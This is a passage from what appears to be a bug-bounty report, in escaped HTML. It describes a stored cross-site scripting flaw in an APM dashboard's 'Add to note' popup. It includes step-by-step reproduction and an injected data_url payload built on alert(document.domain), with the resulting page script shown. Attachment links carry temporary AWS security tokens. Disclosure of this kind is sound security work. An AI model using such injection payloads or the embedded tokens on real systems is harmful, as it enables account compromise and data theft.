class=\"na\"\u003eloadingOverlay\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003esnappable\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003echart_title\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;amp;#x27;\u0026amp;amp;quot;x6nxss\u0026amp;amp;gt;\u0026amp;amp;lt;img src=x6nxss\u0026amp;amp;gt;: Average response time, by tier (ms)\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003eliveChart\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003edataApiUrl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003ezoom_url\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003edataApiField\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003eaddToDashboard\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003eembeddable\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\n          \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ejQuery\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erpm\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehighcharts\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eregisterRender\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eloadChart\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd when I try to add this chart to a note, the \u003ccode\u003edata_url\u003c/code\u003e parameter for request will be taken from the \u003ccode\u003edataURL\u003c/code\u003e parameter directly. So all that I need to perform the attack is to place the single quote inside this custom dashboard chart \u003ccode\u003edataUrl\u003c/code\u003e parameter. But I also need both scripts (this initializer and the one inside the \u003ccode\u003eAdd to note\u003c/code\u003e popup) to be valid so the final payload is tricky a little.\u003c/p\u003e\n\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h3\u003e\n\n\u003cp\u003e1) Sign into the app via account with role \u003ccode\u003eUser\u003c/code\u003e or higher\u003cbr\u003e\n2) Navigate to the some APM app, move mouse over some chart and click \u003ccode\u003eMore\u003c/code\u003e -\u0026gt; \u003ccode\u003eAdd to legacy custom dashboard\u003c/code\u003e, enter some title and click \u003ccode\u003eAdd\u003c/code\u003e. Intercept the request using some intercepting proxy tool (e.g. Burp Suite).\u003cbr\u003e\n3) At the intercept request replace the head of \u003ccode\u003emixed_dashboards_dashboard%5Bchart%5D%5Bdata_url%5D\u003c/code\u003e parameter (\u003ccode\u003e%2Fchart_data%2Fmetric_charts\u003c/code\u003e...) with \u003ccode\u003e/\\\u0026#39;-alert(document.domain)-\\\u0026#39;/..%2Fchart_data%2Fmetric_charts\u003c/code\u003e and send the request. The response will contain the created custom dashboard link.\u003cbr\u003e\n4) Navigate to the created custom dashboard. If you inspect the page source, you will see how the pinned chart is initialized now:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;text/javascript\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003ejQuery\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eloadChart\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e#41871\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003ehighcharts\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n            \u003cspan class=\"na\"\u003eheight\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e400\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003edataUrl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e-alert(document.domain)-\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/../chart_data/metric_charts/app_breakdown.json?account_id=2319495\u0026amp;agent=146103643\u0026amp;application_id=146103643\u0026amp;chart_type=StackedArea2D\u0026amp;clickURL=%2Faccounts%2F2319495%2Fapplications%2F146103643%2Ftransactions\u0026amp;current_product=apm_product\u0026amp;customLineWidth=2\u0026amp;live=true\u0026amp;number_suffix=ms\u0026amp;render_to=current_response_time_single_146103643\u0026amp;tooltipGroup=current_charts\u0026amp;title=123123%3A+Average+response+time%2C+by+tier+%28ms%29\u0026amp;hide_legend=true\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003erender\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003efluid\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003eloadingOverlay\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003esnappable\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003echart_title\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e123123: Average response time, by tier (ms)\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003eliveChart\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003edataApiUrl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003ezoom_url\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003edataApiField\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003eaddToDashboard\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003eembeddable\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\n          \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ejQuery\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erpm\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehighcharts\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eregisterRender\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eloadChart\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e5) Move mouse to the pinned chart and click \u003ccode\u003eMore\u003c/code\u003e -\u0026gt; \u003ccode\u003eAdd to note\u003c/code\u003e. Make sure the payload is executed inside the popup.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"______________2019-05-04___18.23.59.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/484/275/e9ade6d1fd8405753d959d4dd85b10eafe0db47f/______________2019-05-04___18.23.59.png?response-content-disposition=attachment%3B%20filename%3D%22______________2019-05-04___18.23.59.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-05-04___18.23.59.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T062132Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=1b21d77b1aeaee2743a1bcb0f3e78fff849c3796b6a558a7798efbc8940d23ad\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/484/275/e9ade6d1fd8405753d959d4dd85b10eafe0db47f/______________2019-05-04___18.23.59.png?response-content-disposition=attachment%3B%20filename%3D%22______________2019-05-04___18.23.59.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-05-04___18.23.59.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T062132Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=1b21d77b1aeaee2743a1bcb0f3e78fff849c3796b6a558a7798efbc8940d23ad\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\nIf you inspect the popup source now, you will see the payload inside:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003ejQuery\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eready\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003echart_options\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eheight\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e250px\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003efluid\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003esnappable\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eloadingOverlay\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003erender\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003echart_options\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edataUrl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edomain\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/../chart_data/metric_charts/app_breakdown.json?account_id=2319495\u0026amp;agent=146103643\u0026amp;application_id=146103643\u0026amp;chart_type=StackedArea2D\u0026amp;clickURL=%2Faccounts%2F2319495%2Fapplications%2F146103643%2Ftransactions\u0026amp;current_product=apm_product\u0026amp;customLineWidth=2\u0026amp;hide_legend=true\u0026amp;live=true\u0026amp;number_suffix=ms\u0026amp;render_to=current_response_time_single_146103643\u0026amp;title=123123%3A+Average+response+time%2C+by+tier+%28ms%29\u0026amp;tooltipGroup=current_charts\u0026amp;tw%5Bdur%5D=last_7_days\u0026amp;tw%5Bend%5D=1556964641\u0026amp;no_click=1\u0026amp;no_links=1\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e#snapping_chart\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003ehighcharts\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003echart_options\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eP.S.: These steps use the custom dashboards chart \u003ccode\u003edataUrl\u003c/code\u003e, as inside the \u003ca href=\"/reports/544694\"\u003e#544694\u003c/a\u003e, but the vulnerability itself is different – lack of \u003ccode\u003edata_url\u003c/code\u003e parameter escaping, when the \u003ccode\u003eAdd to note\u003c/code\u003e popup is shown.\u003c/p\u003e\n\n\u003ch3 id=\"poc-video\"\u003ePoC-video:\u003c/h3\u003e\n\n\u003cp\u003eAs the exploitation is not trivial, I have recorded the video below, which demonstrates all the process.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"nr_xss_add_to_note.mp4\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/484/277/f4226cb604ec7f36827d18364be5ecfe7ba4e9a4/nr_xss_add_to_note.mp4?response-content-disposition=attachment%3B%20filename%3D%22nr_xss_add_to_note.mp4%22%3B%20filename%2A%3DUTF-8%27%27nr_xss_add_to_note.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T062132Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=fa93c02339022673b06d01c1a3a736cba29671e84f37c9784ccb1a77d4b966f1\" data-attachment-type=\"video/mp4\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/484/277/f4226cb604ec7f36827d18364be5ecfe7ba4e9a4/nr_xss_add_to_note.mp4?response-content-disposition=attachment%3B%20filename%3D%22nr_xss_add_to_note.mp4%22%3B%20filename%2A%3DUTF-8%27%27nr_xss_add_to_note.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T062132Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijG